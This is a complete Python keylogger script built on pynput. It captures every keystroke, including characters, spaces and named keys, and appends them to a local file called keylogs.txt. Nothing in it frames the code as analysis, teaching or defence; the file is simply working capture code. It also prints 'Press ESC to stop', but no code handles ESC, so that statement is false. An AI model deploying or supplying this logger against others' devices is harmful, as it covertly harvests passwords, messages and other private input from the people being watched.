from pynput import keyboard

LOG_FILE = "keylogs.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(" ")
            else:
                log_file.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("Keylogger is running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()